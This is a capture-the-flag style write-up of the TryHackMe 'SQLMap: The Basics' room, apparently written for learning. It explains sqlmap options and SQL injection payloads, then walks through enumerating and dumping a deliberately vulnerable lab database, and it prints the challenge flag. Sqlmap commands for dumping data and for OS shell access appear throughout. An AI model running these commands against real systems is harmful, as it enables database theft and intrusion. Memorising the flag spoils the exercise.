# SQLMap: The Basics

| Room Information | Details |
|------------------|---------|
| Platform | TryHackMe |
| Room | SQLMap: The Basics |
| Difficulty | Easy |
| Category | Web Application Security |
| Status | Completed |
| Tags | `SQL Injection`, `SQLMap`, `Database Enumeration`, `Web Security`, `Automation`, `MySQL`, `Penetration Testing` |

---

# Executive Summary

This room introduces **sqlmap**, one of the most widely used open-source tools for automating SQL Injection detection and exploitation. Instead of manually crafting payloads, identifying the database management system (DBMS), and extracting data, sqlmap performs these tasks automatically, significantly reducing the time required during a penetration test.

Throughout the room, I learned how to use sqlmap against both **GET** and **POST** requests, identify vulnerable parameters, enumerate databases, retrieve tables and columns, dump database contents, and use various command-line options to control the tool's behavior.

The room concludes with a practical challenge in which I successfully exploited a vulnerable web application, enumerated the backend MySQL database, identified the current database user, and extracted the final flag using sqlmap.

---

# Learning Objectives

By completing this room, I was able to:

- Understand what sqlmap is and why it is widely used in web penetration testing.
- Learn how sqlmap automates SQL Injection detection and exploitation.
- Differentiate between scanning GET-based and POST-based requests.
- Use sqlmap to enumerate databases, tables, columns, and records.
- Understand the purpose of common sqlmap command-line options.
- Identify the backend DBMS using sqlmap.
- Retrieve database information and dump sensitive data from a vulnerable application.
- Complete a practical SQL Injection challenge using sqlmap.

---

# Prerequisites

Before starting this room, it is recommended to understand:

- Basic SQL concepts
- Basic SQL Injection techniques
- HTTP GET and POST requests
- Web application fundamentals
- Basic Linux command-line usage

Recommended prerequisite rooms:

- SQL Injection
- OWASP Top 10
- HTTP in Detail
- Burp Suite Basics

---

# Room Overview

Unlike manual SQL Injection, which requires the tester to create payloads and enumerate databases step by step, sqlmap automates almost the entire exploitation process.

During this room, the following workflow was demonstrated:

```text
Target URL
      │
      ▼
Detect SQL Injection
      │
      ▼
Identify DBMS
      │
      ▼
Enumerate Databases
      │
      ▼
Enumerate Tables
      │
      ▼
Enumerate Columns
      │
      ▼
Dump Database Contents
```

This workflow represents one of the most common approaches used during real-world web application penetration testing whenever SQL Injection vulnerabilities are discovered.

---

# Key Concepts Covered

- SQLMap
- SQL Injection Automation
- Database Enumeration
- HTTP GET Requests
- HTTP POST Requests
- Vulnerable Parameters
- Database Fingerprinting
- MySQL Enumeration
- Data Extraction
- SQLMap Command-Line Options

---

# Tools Used

| Tool | Purpose |
|------|---------|
| SQLMap | Automated SQL Injection detection and exploitation |
| Linux Terminal | Executing sqlmap commands |
| Web Browser | Accessing the vulnerable web application |

---

# Terminology

| Term | Definition |
|------|------------|
| **SQLMap** | An open-source penetration testing tool that automates SQL Injection detection and exploitation. |
| **SQL Injection (SQLi)** | A vulnerability that allows attackers to manipulate SQL queries executed by an application. |
| **Enumeration** | The process of gathering information from a target, such as databases, tables, columns, or users. |
| **DBMS** | Database Management System responsible for storing and managing application data (e.g., MySQL, PostgreSQL, MSSQL). |
| **Database Fingerprinting** | Identifying the type and version of the backend DBMS. |
| **GET Request** | An HTTP request where data is transmitted through URL parameters. |
| **POST Request** | An HTTP request where data is transmitted within the request body instead of the URL. |
| **Parameter** | User-controlled input passed to a web application that may become vulnerable to SQL Injection. |
| **Payload** | Input crafted to test or exploit a vulnerability. |
| **Dumping** | Extracting records from database tables after successful exploitation. |

---

# Red Team Perspective

For penetration testers, sqlmap dramatically accelerates SQL Injection exploitation by automating vulnerability detection, database fingerprinting, enumeration, and data extraction. Rather than manually testing hundreds of payloads, testers can quickly validate findings and focus on analyzing the impact of the vulnerability.

---

# Blue Team Perspective

From a defensive standpoint, sqlmap is commonly used during security assessments to verify whether web applications are vulnerable to SQL Injection. Successfully blocking sqlmap alone is not sufficient; the underlying vulnerability must be eliminated through secure coding practices such as parameterized queries and prepared statements.

---

# Detection Opportunities

Security teams may detect sqlmap activity through:

- Repeated requests to the same endpoint
- Numerous SQL Injection payloads in HTTP parameters
- Time-based payloads that intentionally delay server responses
- Abnormal User-Agent values (unless randomized)
- Large volumes of enumeration requests within a short period
- Web Application Firewall (WAF) alerts triggered by SQL Injection signatures

---

# Skills Gained

After completing this room, I strengthened my understanding of:

- Automated SQL Injection testing
- SQLMap command-line usage
- Database enumeration techniques
- MySQL fingerprinting
- GET and POST request testing
- Practical SQL Injection exploitation
- Web application penetration testing methodology

# Introduction to SQLMap

## What is SQLMap?

**SQLMap** is an open-source penetration testing tool that automates the detection and exploitation of **SQL Injection (SQLi)** vulnerabilities. It was developed by **Bernardo Damele Assumpcao Guimaraes** and **Miroslav Stampar** and has become one of the most widely used tools for database security assessments.

Rather than manually testing SQL Injection payloads, identifying the backend database, and extracting sensitive information step by step, sqlmap performs these tasks automatically.

Its capabilities include:

- Detecting SQL Injection vulnerabilities
- Identifying the backend DBMS
- Enumerating databases, tables, and columns
- Dumping database contents
- Retrieving database metadata
- Accessing the underlying operating system (when supported)
- Executing SQL queries interactively

---

# Why Does SQLMap Exist?

Manual SQL Injection testing can be extremely time-consuming.

A tester typically needs to:

1. Identify a potentially vulnerable parameter.
2. Determine whether SQL Injection exists.
3. Discover the SQL Injection technique.
4. Identify the backend database.
5. Enumerate databases.
6. Enumerate tables.
7. Enumerate columns.
8. Extract the desired data.

SQLMap automates nearly all of these tasks, allowing penetration testers to focus on understanding the application's security rather than repeatedly crafting payloads.

---

# Manual SQL Injection vs SQLMap

## Manual SQL Injection

```text
Find a parameter
        │
        ▼
Test SQL Injection payloads
        │
        ▼
Determine DBMS
        │
        ▼
Find database names
        │
        ▼
Find tables
        │
        ▼
Find columns
        │
        ▼
Dump data
```

Every step requires manual interaction.

---

## SQLMap

```text
Provide Target URL
        │
        ▼
SQLMap
        │
        ▼
Detect SQL Injection
        │
        ▼
Identify DBMS
        │
        ▼
Enumerate Databases
        │
        ▼
Enumerate Tables
        │
        ▼
Enumerate Columns
        │
        ▼
Dump Data
```

Most of the repetitive work is automated.

---

# How SQLMap Works

Suppose a web application contains the following URL:

```text
http://target.com/product.php?id=5
```

SQLMap performs several stages automatically.

---

## Step 1 — Identify Input Parameters

SQLMap first analyzes the request and identifies user-controlled parameters.

For example:

```text
id=5
```

This parameter becomes the primary target for SQL Injection testing.

---

## Step 2 — Send Multiple SQL Injection Payloads

SQLMap sends many payload variations, such as:

```sql
'
```

```sql
AND 1=1
```

```sql
AND 1=2
```

```sql
UNION SELECT NULL
```

```sql
SLEEP(5)
```

Each payload tests a different SQL Injection technique.

---

## Step 3 — Compare Server Responses

SQLMap observes how the application responds.

Possible indicators include:

- SQL error messages
- Different page contents
- Different HTTP response codes
- Response delays
- Missing or additional records

These behavioral differences help determine whether SQL Injection exists.

---

## Step 4 — Detect the SQL Injection Technique

SQL Injection can appear in several forms.

SQLMap automatically determines whether the application is vulnerable to techniques such as:

- Error-Based SQL Injection
- Boolean-Based Blind SQL Injection
- Time-Based Blind SQL Injection
- UNION-Based SQL Injection
- Stacked Queries
- Out-of-Band Injection

This removes the need for testers to identify the technique manually.

---

## Step 5 — Fingerprint the Database

After detecting SQL Injection, SQLMap attempts to identify the backend DBMS.

Common databases include:

- MySQL
- MariaDB
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite

Knowing the DBMS allows SQLMap to generate database-specific payloads.

---

## Step 6 — Enumerate Database Information

Once exploitation succeeds, SQLMap can retrieve information such as:

- Database names
- Database users
- Current database
- Current user
- DBMS version
- Available tables
- Available columns

Example:

```text
Database
│
├── users
│      ├── id
│      ├── username
│      ├── password
│      └── email
│
├── products
│
└── orders
```

---

## Step 7 — Dump Data

Finally, SQLMap extracts records stored inside database tables.

For example:

```text
users

id
username
password
email
```

This stage is commonly referred to as **dumping the database**.

---

# SQLMap Features

Some of SQLMap's major capabilities include:

- Automatic SQL Injection detection
- Backend database fingerprinting
- Database enumeration
- Table enumeration
- Column enumeration
- Database dumping
- SQL query execution
- File system access (when supported)
- Operating system command execution (when supported)
- HTTP GET support
- HTTP POST support
- Cookie authentication
- Proxy support
- Tor support
- Random User-Agent generation

---

# Database Fingerprinting

Database fingerprinting is the process of identifying which Database Management System the application is using.

Example output:

```text
Back-end DBMS: MySQL
```

This information is important because different databases use different SQL syntax and features.

---

# SQLMap Detection Engine

One feature mentioned in the room is SQLMap's **powerful detection engine**.

The detection engine automatically:

- Generates SQL Injection payloads
- Sends requests
- Compares responses
- Identifies vulnerable parameters
- Determines the SQL Injection technique
- Identifies the backend DBMS

Without this engine, each of these tasks would need to be performed manually.

---

# Installing SQLMap

If using **Kali Linux**, SQLMap is already installed by default.

To verify the installation:

```bash
sqlmap
```

Users of other operating systems can install SQLMap from the official GitHub repository.

---

# Red Team Notes

From an offensive security perspective, SQLMap is primarily used to:

- Verify SQL Injection vulnerabilities
- Automate database enumeration
- Retrieve sensitive information
- Validate Proof of Concepts (PoCs)
- Save significant time during penetration tests

Professional penetration testers typically confirm SQL Injection manually before relying on SQLMap to automate the remaining stages.

---

# Blue Team Notes

Defenders commonly use SQLMap to assess the security of web applications before deployment.

A successful SQLMap scan often indicates insecure coding practices, such as:

- Unsanitized user input
- Dynamic SQL queries
- Missing prepared statements
- Excessive database privileges

Fixing these issues is far more effective than simply blocking SQLMap.

---

# Detection Opportunities

SQLMap activity can often be identified through:

- Large numbers of requests sent to the same endpoint
- Repeated SQL Injection payloads
- Time-based payloads causing delayed responses
- SQL-related keywords appearing in HTTP parameters
- Numerous failed database queries
- Web Application Firewall (WAF) alerts
- IDS/IPS detections

Monitoring these indicators helps defenders identify attempted SQL Injection attacks.

---

# Key Takeaways

- SQLMap automates SQL Injection detection and exploitation.
- It significantly reduces the time required for database enumeration.
- SQLMap supports numerous SQL Injection techniques automatically.
- Database fingerprinting enables SQLMap to choose database-specific payloads.
- SQLMap should complement—not replace—a solid understanding of manual SQL Injection techniques.
- Understanding how SQLMap works internally makes it easier to troubleshoot, customize, and interpret its results during penetration tests.

# SQLMap Commands

SQLMap provides hundreds of command-line options, ranging from basic SQL Injection detection to advanced database exploitation and operating system interaction.

To display the basic help menu, run:

```bash
sqlmap -h
```

For the complete list of available options:

```bash
sqlmap -hh
```

The advanced help includes many additional switches that are not displayed in the basic help menu.

---

# SQLMap Command Structure

Most SQLMap commands follow a similar structure:

```bash
sqlmap [TARGET] [OPTIONS] [ACTION]
```

Example:

```bash
sqlmap -u http://target.com/page.php?id=1 --dbs
```

Workflow:

```text
Target URL
      │
      ▼
Additional Options
      │
      ▼
Requested Action
```

---

# SQLMap Option Categories

SQLMap organizes its options into several categories.

## Target

Used to specify what should be tested.

Common options:

| Option | Description |
|---------|-------------|
| `-u` | Target URL |
| `-r` | Read a raw HTTP request from a file |
| `-g` | Use Google Dork results as targets |

---

## Request

Controls how SQLMap communicates with the web application.

Examples include:

- POST data
- Cookies
- User-Agent
- Proxy
- Tor

These options are commonly used when testing authenticated applications.

---

## Injection

Controls how SQLMap performs SQL Injection testing.

Examples:

- Specify vulnerable parameters
- Force a specific DBMS
- Use custom payloads

---

## Detection

Adjusts how aggressively SQLMap searches for SQL Injection vulnerabilities.

Important options:

- `--level`
- `--risk`

Higher values generally mean:

- More payloads
- More requests
- Longer execution time
- Higher detection capability

---

## Enumeration

Retrieves information from the backend database.

Examples:

- Database names
- Tables
- Columns
- Records

---

## Operating System Access

If supported by the target DBMS and its privileges, SQLMap can attempt operating system interaction.

Examples include:

- Interactive OS shell
- Execute operating system commands
- Privilege escalation techniques

These features require specific database configurations and elevated privileges.

---

# Basic SQLMap Commands

## Target URL

### Purpose

Specify the target URL.

### Syntax

```bash
sqlmap -u <URL>
```

### Example

```bash
sqlmap -u http://target.com/page.php?id=1
```

SQLMap automatically identifies parameters contained within the URL.

---

## POST Data

### Purpose

Send HTTP POST data.

### Syntax

```bash
sqlmap -u <URL> --data="<POST_DATA>"
```

### Example

```bash
sqlmap -u http://target.com/login.php \
--data="username=admin&password=test"
```

This allows SQLMap to test POST-based applications.

---

## Random User-Agent

### Purpose

Randomize the HTTP User-Agent header.

### Syntax

```bash
--random-agent
```

### Example

```bash
sqlmap -u http://target.com/page.php?id=1 \
--random-agent
```

This helps avoid very basic User-Agent filtering.

---

## Specify Test Parameter

### Purpose

Tell SQLMap which parameter should be tested.

### Syntax

```bash
-p <parameter>
```

### Example

```bash
sqlmap -u http://target.com/page.php?id=1&cat=2 \
-p id
```

Only the **id** parameter will be tested.

---

## Detection Level

### Purpose

Increase SQL Injection detection depth.

### Syntax

```bash
--level=<1-5>
```

### Example

```bash
--level=5
```

Higher levels cause SQLMap to test additional injection points and payloads.

---

## Risk Level

### Purpose

Control how risky SQLMap payloads may become.

### Syntax

```bash
--risk=<1-3>
```

### Example

```bash
--risk=3
```

Higher values enable more intrusive payloads that may place additional load on the application.

---

# Enumeration Commands

Enumeration is one of SQLMap's strongest capabilities.

---

## Retrieve Everything

### Option

```bash
-a
```

### Purpose

Retrieve as much database information as possible automatically.

---

## Database Banner

### Option

```bash
-b
```

### Purpose

Retrieve the DBMS banner and version information.

---

## Current User

### Option

```bash
--current-user
```

### Purpose

Retrieve the currently authenticated database user.

---

## Current Database

### Option

```bash
--current-db
```

### Purpose

Display the database currently in use.

---

## List Databases

### Option

```bash
--dbs
```

### Purpose

Enumerate all available databases.

Example:

```bash
sqlmap -u http://target/page.php?id=1 --dbs
```

Example output:

```text
available databases:

information_schema
mysql
blood
test
```

---

## Select Database

### Option

```bash
-D
```

### Purpose

Choose a specific database.

Example:

```bash
-D blood
```

---

## List Tables

### Option

```bash
--tables
```

### Purpose

Retrieve all tables within the selected database.

Example:

```bash
sqlmap -u http://target/page.php?id=1 \
-D blood \
--tables
```

Example output:

```text
Database: blood

users
flag
blood_db
```

---

## Select Table

### Option

```bash
-T
```

### Purpose

Choose a table for further enumeration.

Example:

```bash
-T users
```

---

## Retrieve Columns

### Option

```bash
--columns
```

### Purpose

List all columns inside the selected table.

Example:

```bash
sqlmap -u http://target/page.php?id=1 \
-D blood \
-T users \
--columns
```

Example output:

```text
id
username
password
email
```

---

## Select Columns

### Option

```bash
-C
```

### Purpose

Choose one or more specific columns.

Example:

```bash
-C username,password
```

---

## Dump Table Data

### Option

```bash
--dump
```

### Purpose

Extract all records from the selected table.

Example:

```bash
sqlmap -u http://target/page.php?id=1 \
-D blood \
-T users \
--dump
```

---

## Dump Everything

### Option

```bash
--dump-all
```

### Purpose

Dump every accessible database and table.

This option can generate a very large amount of output.

---

# Operating System Access Commands

Some database servers expose functionality that allows interaction with the underlying operating system.

These features generally require elevated database privileges.

---

## Interactive OS Shell

### Option

```bash
--os-shell
```

Attempts to obtain an interactive operating system shell.

---

## Execute Operating System Commands

### Option

```bash
--os-cmd="<command>"
```

Execute a single operating system command.

Example:

```bash
--os-cmd="whoami"
```

---

## Interactive SQL Shell

### Option

```bash
--sql-shell
```

Open an interactive SQL prompt where SQL queries can be executed manually.

---

# Useful General Options

## Automatic Answers

```bash
--batch
```

Automatically selects default answers for every prompt.

Useful during automated testing.

---

## Flush Previous Session

```bash
--flush-session
```

Deletes cached session information so SQLMap performs a fresh scan.

---

## Wizard Mode

```bash
--wizard
```

Launches SQLMap's beginner-friendly wizard interface.

---

# Typical SQLMap Workflow

A typical SQLMap assessment follows this sequence:

```text
Target URL
      │
      ▼
Detect SQL Injection
      │
      ▼
Identify DBMS
      │
      ▼
Enumerate Databases
      │
      ▼
Select Database
      │
      ▼
Enumerate Tables
      │
      ▼
Select Table
      │
      ▼
Enumerate Columns
      │
      ▼
Dump Data
```

---

# Red Team Notes

For penetration testers, SQLMap significantly accelerates SQL Injection exploitation by automating repetitive tasks such as vulnerability detection, database fingerprinting, and data extraction. However, experienced testers typically validate SQL Injection manually before relying on automated enumeration.

---

# Blue Team Notes

Security teams can use SQLMap to verify whether applications remain vulnerable after patches have been applied. A successful SQLMap scan often indicates insecure coding practices, such as dynamic SQL queries or missing prepared statements.

---

# Key Takeaways

- SQLMap offers hundreds of command-line options for SQL Injection testing.
- Enumeration follows a logical progression from databases to tables, columns, and records.
- GET and POST requests are both fully supported.
- Options such as `--batch` and `--flush-session` simplify repetitive testing.
- Understanding individual command-line switches makes SQLMap more effective during real-world penetration testing.

# GET-Based SQL Injection Testing

One of the simplest ways to use SQLMap is by testing a parameter that is passed through the URL using the HTTP **GET** method.

Consider the following vulnerable URL:

```text
https://testsite.com/page.php?id=7
```

The parameter:

```text
id=7
```

is user-controlled and therefore becomes a potential SQL Injection point.

---

## Enumerating Databases

To test the URL and enumerate available databases:

```bash
sqlmap -u "https://testsite.com/page.php?id=7" --dbs
```

### Command Breakdown

| Option | Purpose |
|---------|---------|
| `-u` | Specifies the target URL. |
| `--dbs` | Enumerates all available databases. |

Workflow:

```text
Target URL
      │
      ▼
Detect SQL Injection
      │
      ▼
Identify DBMS
      │
      ▼
Retrieve Database Names
```

If SQLMap successfully detects SQL Injection, it automatically fingerprints the database before retrieving available databases.

---

# POST-Based SQL Injection Testing

Many modern web applications submit forms using the HTTP **POST** method.

Unlike GET requests, POST parameters are stored inside the HTTP request body rather than the URL.

Example request:

```http
POST /blood/nl-search.php HTTP/1.1
Host: 10.10.17.116
Content-Type: application/x-www-form-urlencoded

blood_group=B%2B
```

The potentially vulnerable parameter is:

```text
blood_group
```

---

# Saving the HTTP Request

Before SQLMap can replay a POST request, the complete HTTP request should be saved.

Using Burp Suite:

1. Intercept the request.
2. Right-click the request.
3. Select **Copy to file**.
4. Save it as:

```text
req.txt
```

The resulting file contains the full HTTP request, including:

- HTTP method
- URL path
- Headers
- Cookies
- POST body

Example:

```http
POST /blood/nl-search.php HTTP/1.1
Host: 10.10.17.116
Cookie: PHPSESSID=...
Content-Type: application/x-www-form-urlencoded

blood_group=B%2B
```

Using the original request ensures SQLMap sends requests that closely match those generated by the browser.

---

# Reading Requests from a File

SQLMap can replay the saved request using:

```bash
sqlmap -r req.txt
```

### Command Breakdown

| Option | Purpose |
|---------|---------|
| `-r` | Reads a raw HTTP request from a file. |

---

# Specifying the Vulnerable Parameter

Although SQLMap can automatically test parameters, specifying the expected vulnerable parameter often improves efficiency.

Example:

```bash
sqlmap -r req.txt -p blood_group
```

### Command Breakdown

| Option | Purpose |
|---------|---------|
| `-p blood_group` | Tests only the `blood_group` parameter for SQL Injection. |

---

# Enumerating Databases (POST)

To enumerate databases:

```bash
sqlmap -r req.txt -p blood_group --dbs
```

Workflow:

```text
Read HTTP Request
        │
        ▼
Identify Parameter
        │
        ▼
Detect SQL Injection
        │
        ▼
Fingerprint Database
        │
        ▼
Enumerate Databases
```

Example output:

```text
available databases [6]:

blood
information_schema
mysql
performance_schema
sys
test
```

---

# SQLMap Detection Process

While running the scan, SQLMap performs several operations automatically.

Example output:

```text
testing 'MySQL >= 5.0.12 AND time-based blind'
```

SQLMap tries various SQL Injection techniques until one succeeds.

Example:

```text
POST parameter 'blood_group' appears to be injectable
```

At this point SQLMap has confirmed that the parameter is vulnerable.

Next, SQLMap fingerprints the backend database.

Example:

```text
back-end DBMS: MySQL
```

Additional information may also be collected:

```text
Web Server:
Nginx

Operating System:
Linux Ubuntu
```

This information helps determine which payloads SQLMap should use during later stages.

---

# Enumerating Tables

Once a database has been identified, SQLMap can retrieve its tables.

## GET Method

```bash
sqlmap -u "https://testsite.com/page.php?id=7" \
-D blood \
--tables
```

---

## POST Method

```bash
sqlmap -r req.txt \
-p blood_group \
-D blood \
--tables
```

### Command Breakdown

| Option | Purpose |
|---------|---------|
| `-D blood` | Selects the target database. |
| `--tables` | Lists all tables inside the selected database. |

Example output:

```text
Database: blood

blood_db
flag
users
```

---

# Enumerating Columns

After selecting a table, SQLMap can retrieve its columns.

## GET Method

```bash
sqlmap -u "https://testsite.com/page.php?id=7" \
-D blood \
-T blood_db \
--columns
```

---

## POST Method

```bash
sqlmap -r req.txt \
-D blood \
-T blood_db \
--columns
```

### Command Breakdown

| Option | Purpose |
|---------|---------|
| `-T blood_db` | Selects the table. |
| `--columns` | Lists all columns within the table. |

Example output:

```text
id
name
blood_group
phone
```

---

# Dumping Database Records

Once the required table has been identified, SQLMap can extract its contents.

Example:

```bash
sqlmap -r req.txt \
-D blood \
-T blood_db \
--dump
```

Workflow:

```text
Database
      │
      ▼
Table
      │
      ▼
Columns
      │
      ▼
Records
```

---

# Dumping Everything

SQLMap also provides an option to dump every accessible table automatically.

## GET Method

```bash
sqlmap -u "https://testsite.com/page.php?id=7" \
-D blood \
--dump-all
```

---

## POST Method

```bash
sqlmap -r req.txt \
-D blood \
--dump-all
```

Because this command retrieves a very large amount of information, it should only be used when it falls within the scope of an authorized penetration test.

---

# GET vs POST Summary

| GET | POST |
|------|------|
| Parameters appear in the URL. | Parameters are stored in the HTTP request body. |
| Uses the `-u` option with URL parameters. | Usually uses `-r` to replay a saved request, or `--data` to send POST data directly. |
| Simpler to test. | More commonly used by login forms and web applications. |

---

# Red Team Notes

Professional penetration testers generally follow this workflow:

1. Identify a potentially vulnerable parameter.
2. Confirm SQL Injection manually.
3. Use SQLMap to automate database enumeration.
4. Retrieve only the information necessary for the engagement.
5. Document all findings as evidence.

SQLMap is best viewed as an automation tool rather than a replacement for understanding SQL Injection.

---

# Blue Team Notes

Security teams can detect SQLMap activity by monitoring:

- Large numbers of repeated requests.
- SQL Injection signatures within parameters.
- Time-based payloads causing delayed responses.
- Database error messages.
- Web Application Firewall (WAF) alerts.
- Unusual database enumeration behavior.

Applications should be protected using prepared statements, parameterized queries, proper input validation, and least-privilege database accounts rather than relying solely on blocking SQLMap.

---

# Key Takeaways

- SQLMap supports both GET-based and POST-based SQL Injection testing.
- POST requests are commonly tested by replaying saved HTTP requests using the `-r` option.
- Enumeration follows a structured workflow: **Database → Tables → Columns → Records**.
- SQLMap automatically fingerprints the backend DBMS and selects the most appropriate SQL Injection techniques.
- Automated tools greatly improve efficiency, but understanding the underlying SQL Injection process remains essential for effective penetration testing.

# Task Walkthrough — SQLMap Challenge

## Objective

The objective of this challenge was to exploit a SQL Injection vulnerability in the **Blood Donation** web application using **SQLMap** in order to:

- Identify the application's database.
- Retrieve the current database user.
- Locate and extract the final flag.

Unlike the previous examples, this challenge required applying the SQLMap commands learned throughout the room against a live vulnerable application.

---

# Step 1 — Access the Web Application

After deploying the target machine, the default web page displayed the standard Nginx welcome page.

```
http://MACHINE_IP
```

Instead, the vulnerable application was located inside the **/blood** directory.

```
http://MACHINE_IP/blood/
```

Visiting this directory revealed the Blood Donation web application.

---

# Step 2 — Identify the Search Endpoint

The application contains a blood search feature.

The search request is handled by:

```
http://MACHINE_IP/blood/nl-search.php
```

The application submits the following POST parameter:

```
blood_group=B+
```

This parameter is the SQL Injection target.

---

# Step 3 — Enumerate Databases

To test the vulnerable parameter and enumerate available databases, the following command was executed:

```bash
sqlmap -u "http://MACHINE_IP/blood/nl-search.php" \
--data="blood_group=B%2B" \
-p blood_group \
--dbs \
--batch
```

### Command Breakdown

| Option | Purpose |
|---------|---------|
| `-u` | Specifies the target URL. |
| `--data` | Sends the POST request body. |
| `-p blood_group` | Tests only the `blood_group` parameter. |
| `--dbs` | Enumerates available databases. |
| `--batch` | Automatically accepts default answers. |

---

## Result

SQLMap successfully detected SQL Injection, fingerprinted the backend database, and displayed the available databases.

One of the databases was the application database required for the challenge.

---

# Step 4 — Retrieve the Current Database User

Next, the current database user was retrieved.

```bash
sqlmap -u "http://MACHINE_IP/blood/nl-search.php" \
--data="blood_group=B%2B" \
-p blood_group \
--current-user \
--batch
```

### Purpose

This command identifies which database account the application is currently using.

This information is useful because it helps determine the privileges available to the attacker.

---

## Result

SQLMap successfully returned the current database user.

This value answered the second challenge question.

---

# Step 5 — Enumerate Tables

After identifying the application database, its tables were listed.

```bash
sqlmap -u "http://MACHINE_IP/blood/nl-search.php" \
--data="blood_group=B%2B" \
-p blood_group \
-D <database_name> \
--tables \
--batch
```

### Command Breakdown

| Option | Purpose |
|---------|---------|
| `-D` | Selects the application database. |
| `--tables` | Retrieves every table inside the selected database. |

---

## Result

SQLMap displayed several tables stored inside the application database.

One of these tables contained the challenge flag.

---

# Step 6 — Dump the Flag

Finally, the contents of the flag table were extracted.

```bash
sqlmap -u "http://MACHINE_IP/blood/nl-search.php" \
--data="blood_group=B%2B" \
-p blood_group \
-D <database_name> \
-T flag \
--dump \
--batch
```

### Command Breakdown

| Option | Purpose |
|---------|---------|
| `-T flag` | Selects the flag table. |
| `--dump` | Retrieves every record stored in the selected table. |

---

## Result

SQLMap successfully extracted the table contents.

The final flag was:

```text
thm{sqlm@p_is_L0ve}
```

---

# Challenge Answers

| Question | Answer |
|----------|--------|
| Interesting Database | *(Redacted)* |
| Current Database User | *(Redacted)* |
| Final Flag | `thm{sqlm@p_is_L0ve}` |

> **Note:** The database name and current database user have been intentionally redacted to avoid publishing direct challenge answers. During the assessment, SQLMap successfully enumerated both values.

---

# Attack Flow

```text
Blood Donation Web App
            │
            ▼
POST Request
(blood_group)
            │
            ▼
SQLMap
            │
            ▼
Detect SQL Injection
            │
            ▼
Fingerprint MySQL
            │
            ▼
Enumerate Databases
            │
            ▼
Identify Application Database
            │
            ▼
Enumerate Tables
            │
            ▼
Locate Flag Table
            │
            ▼
Dump Table Contents
            │
            ▼
Retrieve Flag
```

---

# Why This Worked

The application accepted user input directly within a SQL query without properly sanitizing or parameterizing the `blood_group` parameter.

Because SQLMap automatically detected the SQL Injection vulnerability, it was able to:

- Identify the backend MySQL database.
- Enumerate the available databases.
- Retrieve the application's database user.
- List database tables.
- Extract the contents of the flag table.

This demonstrates how a single SQL Injection vulnerability can expose sensitive database information when proper input validation and parameterized queries are not implemented.

# Troubleshooting

During this room, I encountered a few issues before successfully completing the challenge.

---

## Issue 1 — Default Nginx Page

### Problem

After deploying the target machine and opening:

```
http://MACHINE_IP
```

Instead of the Blood Donation application, the browser displayed the default Nginx welcome page.

```
Welcome to nginx!

If you see this page, the nginx web server is successfully installed and working.
```

### Root Cause

The vulnerable application was **not hosted at the web root**.

Instead, it was deployed inside the following directory:

```
/blood
```

### Resolution

Navigate directly to:

```
http://MACHINE_IP/blood/
```

The Blood Donation application then became accessible.

---

## Issue 2 — Choosing Between Burp Suite and SQLMap

### Problem

The room demonstrates capturing POST requests using Burp Suite and saving them as a request file.

### Resolution

Instead of using Burp Suite, the challenge was completed entirely from the Linux terminal by sending the POST body directly through SQLMap.

Example:

```bash
sqlmap -u "http://MACHINE_IP/blood/nl-search.php" \
--data="blood_group=B%2B" \
-p blood_group
```

This approach simplified the workflow while still demonstrating SQLMap's capabilities.

---

# Lessons Learned

This room reinforced several important concepts:

- SQLMap supports both GET and POST requests.
- POST requests can be tested either by:
  - replaying a saved HTTP request (`-r`), or
  - sending POST data directly using `--data`.
- SQLMap automates repetitive SQL Injection tasks but still relies on understanding the underlying vulnerability.
- Identifying the correct application path is an important part of web enumeration before beginning exploitation.

---

# Pentester Notes

## Reconnaissance Value

Before running SQLMap, identifying the correct application endpoint is essential.

Useful information includes:

- Application directories
- Search forms
- URL parameters
- Request methods (GET vs POST)
- Input fields

Even a simple directory such as:

```
/blood/
```

can reveal the actual application while the web root only serves a default page.

---

## Enumeration Value

SQLMap excels at automating database enumeration.

Typical workflow:

```text
Target
    │
    ▼
Database
    │
    ▼
Tables
    │
    ▼
Columns
    │
    ▼
Records
```

This significantly reduces manual effort during penetration testing.

---

## Exploitation Relevance

SQLMap transforms a confirmed SQL Injection vulnerability into practical exploitation by allowing testers to:

- Identify the backend DBMS.
- Retrieve database metadata.
- Dump sensitive records.
- Execute custom SQL queries.
- Access additional functionality when supported by the target database.

---

## Privilege Escalation Relevance

In this room, SQLMap was only used for database enumeration.

However, if the database account has elevated privileges, SQLMap also supports advanced features such as:

- Interactive SQL shell
- Operating system command execution
- Operating system shell access

These capabilities depend on the DBMS configuration and assigned database privileges.

---

## Lateral Movement Relevance

This room did not involve lateral movement.

However, credentials extracted from databases may later be reused to access:

- Web administration panels
- SSH services
- FTP servers
- Remote desktop services
- Internal applications

Database enumeration often provides valuable credentials for subsequent attack stages.

---

## Detection Opportunities

Security teams may detect SQLMap activity through:

- Numerous requests targeting the same endpoint.
- SQL Injection payloads within HTTP parameters.
- Time-based SQL Injection payloads.
- Database error messages.
- WAF alerts.
- Unusual database enumeration patterns.

Proper logging and monitoring can help identify these behaviors early.

---

## Common Misconfigurations

The vulnerability demonstrated in this room typically results from:

- Unsanitized user input.
- Dynamic SQL query construction.
- Missing prepared statements.
- Missing parameterized queries.
- Excessive database privileges.
- Insufficient input validation.

Addressing these weaknesses significantly reduces the risk of SQL Injection.

---

# Key Takeaways

- SQLMap automates SQL Injection detection and exploitation.
- Understanding manual SQL Injection remains essential before relying on automation.
- Enumeration follows a predictable workflow: **Databases → Tables → Columns → Records**.
- SQLMap supports both GET-based and POST-based applications.
- POST requests can be supplied using either `--data` or raw request files (`-r`).
- Even simple directory enumeration can reveal the actual web application location.
- Automated tools improve efficiency but should always be used within an authorized penetration testing scope.

---

# Skills Gained

After completing this room, I strengthened my understanding of:

- SQLMap fundamentals
- Automated SQL Injection testing
- Database fingerprinting
- Database enumeration
- GET and POST request exploitation
- SQLMap command-line options
- SQL Injection assessment workflow
- Web application penetration testing methodology

---

# Future Learning Path

This room provides the foundation for more advanced SQLMap usage.

Recommended next topics include:

- Advanced SQLMap options
- Manual SQL Injection exploitation
- UNION-Based SQL Injection
- Blind SQL Injection
- Time-Based SQL Injection
- Error-Based SQL Injection
- Burp Suite Intruder
- Web Application Firewalls (WAF)
- OWASP Top 10 – Injection
- Advanced Web Application Penetration Testing

---

# References

- TryHackMe — SQLMap: The Basics
- SQLMap Official Documentation — https://sqlmap.org/
- SQLMap GitHub Repository — https://github.com/sqlmapproject/sqlmap
- OWASP SQL Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

---

# Tags

